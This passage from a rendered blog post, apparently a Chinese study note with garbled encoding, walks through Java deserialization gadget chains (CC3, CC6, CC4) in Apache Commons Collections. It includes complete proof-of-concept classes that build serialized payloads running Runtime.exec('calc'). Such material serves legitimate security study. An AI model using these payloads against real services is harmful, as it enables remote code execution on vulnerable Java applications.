class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404210853512.png" alt="image-20240404210853512"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404210915350.png" alt="image-20240404210915350"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC32</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//åªå¯¹invokerTransformerè¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å°±ä¼šåœ¨checkSetValueå¤„è°ƒç”¨transformæ–¹æ³•</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        transformedMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformedMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC6">CC6</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>ç®€å•æ¥è¯´æ˜¯DNSURLé“¾ä¸CC1çš„ç»“åˆï¼Œåˆ©ç”¨HashMapè°ƒç”¨æŸç±»çš„hashcodeæ–¹æ³•ï¼Œå†åˆ©ç”¨hashcodeè°ƒç”¨CC1ä¸­LazyMapé“¾çš„getæ–¹æ³•ï¼Œè¿›è€Œé“¾æ¥æ•´æ¡çº¿è·¯</p><h3 id="TiedMapEntry-hashCode">TiedMapEntry.hashCode</h3><p>åˆ©ç”¨ TiedMapEntry.hashCode å»è§¦å‘ LazyMap.get,æˆ‘ä»¬è¿›æ¥çœ‹ä¸€ä¸‹å®ƒçš„ hashCode</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233215141.png" alt="image-20240403233215141"></p><p>è·Ÿè¿› getValue</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233236830.png" alt="image-20240403233236830"></p><p>å†çœ‹ä¸€ä¸‹å®ƒçš„æ„é€ å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233243699.png" alt="image-20240403233243699"></p><p>å°±æ˜¯æ„é€ é”®å€¼å¯¹ï¼Œé‚£ä¹ˆåªéœ€è¦è®©å…¶mapä¸º LazyMap å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233253181.png" alt="image-20240403233253181"></p><p>ç„¶åå†çœ‹ HashMap.readObject</p><h3 id="HashMap-readObject">HashMap.readObject</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233327793.png" alt="image-20240403233327793"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233335386.png" alt="image-20240403233335386"></p><p>å°±æ˜¯è¿™é‡Œè§¦å‘ hashCode ,åªéœ€è¦è®©å…¶keyä¸º TiedMapEntry å³å¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240403233343813.png" alt="image-20240403233343813"></p><p>å› ä¸ºå¯¹äºmapçš„èµ‹å€¼å¿…é¡»è¦ç”¨putï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨putè¿›è¡Œçš„èµ‹å€¼</p><h3 id="é—®é¢˜è§£å†³">é—®é¢˜è§£å†³</h3><p>è¿™é‡Œçš„putä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ä»–æ‰§è¡Œçš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œè¿›è€Œå°†æ•´æ¡é“¾å­ è§¦å‘ä¸€æ¬¡</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404130005220.png" alt="image-20240404130005220"></p><p>è€Œæœ€å…³é”®çš„æ˜¯åœ¨lazyMapéƒ¨åˆ†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404130041260.png" alt="image-20240404130041260"></p><p>åœ¨è¿™é‡Œè§¦å‘å®Œé“¾å­ä¹‹åï¼Œä¼šæ‰§è¡Œmap.putæ“ä½œï¼Œå°†keyæ”¾åˆ°mapé‡Œé¢ï¼Œè€Œæˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œfactory.transformçš„æ¡ä»¶æ˜¯mapä¸­çš„keyä¸å­˜åœ¨ã€‚å¦‚æœæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°†mapä¸­çš„keyèµ‹å€¼ï¼Œå°†ä¼šå¯¼è‡´å…¶åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ— æ³•è¿›å…¥ifåˆ¤æ–­ï¼Œè¿›è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦ç”¨ç‰¹å®šçš„è¯­å¥åœ¨åºåˆ—åŒ–ä¹‹å‰å°†mapä¸­çš„keyå»æ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="POC1-2">POC1</h3><p>è¿™é‡Œå…ˆç»™å‡ºé“¾å­ï¼ˆæˆ‘è‡ªå·±å†™çš„ç‰ˆæœ¬ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//æŸ¥çœ‹æ„é€ å‡½æ•°ï¼Œä¼ å…¥çš„keyå’Œvalue</span></span><br><span class="line">       HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//mapçš„å›ºå®šè¯­æ³•ï¼Œå¿…é¡»è¦putè¿›å»,è¿™é‡Œçš„putä¼šå°†é“¾å­è¿èµ·æ¥ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        map1.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       serialize(map1);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POC2-3">POC2</h3><p>è¿™é‡Œå’Œæˆ‘è‡ªå·±çš„pocçš„åŒºåˆ«å°±æ˜¯åœ¨å¼€å§‹çš„æ—¶å€™å°†è§¦å‘è®¡ç®—å™¨çš„è°ƒç”¨é“¾æ”¹æˆäº†æ²¡ç”¨çš„transfromï¼Œåœ¨åºåˆ—åŒ–ä¹‹å‰å†å°†å…¶æ›¿æ¢å›æ¥ï¼Œå®æµ‹åº”è¯¥æ˜¯å¯¹é“¾å­æ•´ä½“çš„è§¦å‘æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æŸ¥çœ‹æ„é€ å‡½æ•°ï¼Œä¼ å…¥çš„keyå’Œvalue</span></span><br><span class="line">       HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//mapçš„å›ºå®šè¯­æ³•ï¼Œå¿…é¡»è¦putè¿›å»,è¿™é‡Œçš„putä¼šå°†é“¾å­è¿èµ·æ¥ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        map1.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       serialize(map1);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4">CC4</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><h3 id="åˆ†æ">åˆ†æ</h3><p>å› ä¸º CommonsCollections4 é™¤4.0çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚</p><p>æˆ‘ä»¬æ‰¾äº† TransformingComparator.compare è¿›è¡Œå­—èŠ‚ç åŠ è½½</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222002550.png" alt="image-20240404222002550"></p><p>æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº† TransformingComparator.compareï¼Œå‘ç°åœ¨ PriorityQueue.readObject</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222043231.png" alt="image-20240404222043231"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222046911.png" alt="image-20240404222046911"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222049809.png" alt="image-20240404222049809"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222057346.png" alt="image-20240404222057346"></p><p>å¼€å§‹æ„é€ </p><p>å…ˆçœ‹ TransformingComparator çš„æ„é€ æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222116015.png" alt="image-20240404222116015"></p><p>å¯ä»¥ç›´æ¥èµ‹å€¼ï¼Œç„¶åçœ‹ PriorityQueue çš„æ„é€ æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222132557.png" alt="image-20240404222132557"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶ï¼Œé‚£ä¹ˆæ„é€ </p><figure class="highlight java"><table><tr><td 